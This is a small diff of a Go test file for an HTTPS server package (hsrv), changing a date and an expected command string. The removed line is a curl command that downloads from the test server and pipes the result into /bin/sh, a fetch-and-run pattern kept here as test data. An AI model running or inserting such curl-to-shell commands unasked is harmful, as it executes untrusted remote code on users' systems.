@@ -5,7 +5,7 @@ package hsrv
  * Tests for hserv.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20241217
+ * Last Modified 20250615
  */
 
 import (
@@ -177,7 +177,7 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 			Line: fmt.Sprintf(
 				"curl -sk "+
 					"--pinnedpubkey sha256//%s "+
-					"https://%s/c | /bin/sh",
+					"https://%s",
 				s.l.Fingerprint,
 				addr,
 			),
